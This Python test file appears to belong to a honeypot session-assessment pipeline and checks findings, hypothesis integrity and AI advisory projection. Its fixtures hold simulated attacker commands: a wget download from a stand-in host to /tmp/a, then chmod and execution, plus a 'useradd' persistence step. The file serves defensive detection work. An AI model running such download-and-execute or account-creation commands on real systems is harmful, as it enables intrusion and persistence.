from __future__ import annotations

import copy

import pytest

from production.classification.classification_pipeline import NotebookParityClassifier
from production.ai_advisory.contracts import load_ai_advisory_policy
from production.ai_advisory.projection import build_ai_advisory_projection
from production.reporting.session_assessment_v4 import (
    read_legacy_session_assessment,
    validate_session_assessment_v4,
)
from production.reporting.session_assessment_v5 import (
    build_session_assessment_v5,
    canonical_assessment_id,
    validate_session_assessment_v5,
)
from production.workers.session_monitor import SessionMonitor
from production.utils.serialization import session_to_payload
from tests.test_cross_family_relationship_evaluation import (
    BEHAVIOR_POLICY,
    CLASSIFICATION_POLICY,
    _payload,
)


class _Mitre:
    @staticmethod
    def get_name(ttp: str) -> str:
        return ttp

    @staticmethod
    def get_tactics(ttp: str) -> list[str]:
        return ["persistence"] if ttp == "T1136" else ["discovery"]


def _v5(case: dict) -> dict:
    payload = _payload(case)
    return build_session_assessment_v5(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )


def _incomplete() -> dict:
    return _v5({
        "case_id": "phase3-incomplete",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
        ],
    })


def test_audit_only_behavioral_candidate_is_not_a_canonical_finding() -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=_Mitre())
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    event = {
        "eventid": "cowrie.command.success",
        "session": "phase3-authority",
        "src_ip": "203.0.113.30",
        "timestamp": "2026-08-13T00:00:00Z",
        "input": "useradd audithelper",
        "success": 1,
    }
    monitor.on_event(event)
    payload = session_to_payload(monitor.get_session("phase3-authority"))
    report = build_session_assessment_v5(
        [payload],
        raw_events=[event],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )
    assert not any(
        finding.get("finding_type") == "possible_continued_access_preparation"
        for finding in report["behavioral_findings"]
    )
    audit = [
        finding for finding in report["audit_only_behavioral_candidates"]
        if finding.get("finding_type") == "possible_continued_access_preparation"
    ]
    assert len(audit) == 1
    decision = next(
        item for item in report["canonical_evidence"]["semantic_graph"]["authority_decisions"]
        if item["candidate_id"] == audit[0]["finding_id"]
    )
    assert decision["decision"] == "audit_only"
    assert validate_session_assessment_v5(report) == []


def test_every_canonical_finding_has_one_trusted_authority_decision() -> None:
    report = _v5({
        "case_id": "phase3-complete",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    decisions = report["canonical_evidence"]["semantic_graph"]["authority_decisions"]
    for finding in report["behavioral_findings"]:
        matches = [item for item in decisions if item["candidate_id"] == finding["finding_id"]]
        assert len(matches) == 1
        assert matches[0]["decision"] == "trusted"


@pytest.mark.parametrize(
    ("path", "replacement"),
    [
        (("question",), "Did the attacker compromise the real host?"),
        (("scope",), "confirmed_real_host_compromise"),
        (("status",), "confirmed_observed_fact"),
        (("alternatives_are_exhaustive",), True),
        (("alternatives_are_mutually_exclusive",), True),
        (("evidence_strength",), "confirmed"),
        (("evidence_gaps",), []),
        (("limitations",), []),
        (("hypotheses", 0, "statement"), "Attacker deployed malware."),
        (("hypotheses", 0, "status"), "confirmed"),
        (("hypotheses", 0, "falsification_conditions"), []),
    ],
)
def test_every_hypothesis_meaning_field_is_integrity_bound(path, replacement) -> None:
    report = _incomplete()
    mutated = copy.deepcopy(report)
    target = mutated["hypothesis_sets"][0]
    for key in path[:-1]:
        target = target[key]
    target[path[-1]] = replacement
    assert validate_session_assessment_v5(mutated)


@pytest.mark.parametrize(
    "field",
    ["chain_refs", "relationship_refs", "fact_refs", "entity_refs", "evidence_refs"],
)
def test_unknown_hypothesis_reference_domain_fails_closed(field: str) -> None:
    report = _incomplete()
    report["hypothesis_sets"][0][field] = ["forged-reference"]
    assert any(
        "do not resolve" in error
        for error in validate_session_assessment_v5(report)
    )


def test_complete_chain_has_finding_and_no_incomplete_hypothesis() -> None:
    report = _v5({
        "case_id": "phase3-complete-no-hypothesis",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    assert any(
        item.get("finding_type") == "connected_transfer_permission_execution"
        for item in report["behavioral_findings"]
    )
    assert report["hypothesis_sets"] == []


def test_incomplete_chain_hypothesis_survives_validated_ai_projection() -> None:
    report = _incomplete()
    policy, policy_sha256, _ = load_ai_advisory_policy()
    projection = build_ai_advisory_projection(
        report,
        policy=policy,
        policy_sha256=policy_sha256,
    )
    projected_ids = {
        item["hypothesis_id"] for item in projection["hypotheses"]
    }
    expected_ids = {
        alternative["hypothesis_id"]
        for hypothesis_set in report["hypothesis_sets"]
        for alternative in hypothesis_set["hypotheses"]
    }
    assert projected_ids == expected_ids
    assert all(item["status"] == "active" for item in projection["hypotheses"])
    assert projection["authority"]["ai_hypothesis_authority"] is False


def test_non_authoritative_context_cannot_change_v5_identity() -> None:
    report = _incomplete()
    mutated = copy.deepcopy(report)
    mutated["non_authoritative_context"]["prediction"] = {
        "predicted_tactic": "impact",
        "recommendations": ["invent compromise"],
    }
    assert canonical_assessment_id(mutated) == report["assessment_id"]


def test_historical_v4_remains_readable_without_v5_adaptation() -> None:
    payload = _payload({
        "case_id": "phase3-historical",
        "events": [("whoami", "success")],
    })
    from production.reporting.session_assessment_v4 import build_session_assessment_v4

    historical = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=str(BEHAVIOR_POLICY),
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )
    assert historical["schema_version"] == "session_assessment.v4"
    assert validate_session_assessment_v4(historical) == []
    adapted = read_legacy_session_assessment(historical)
    assert adapted["status"] == "legacy_read_only"
    assert adapted["source_schema_version"] == "session_assessment.v4"
    assert adapted["recomputed"] is False
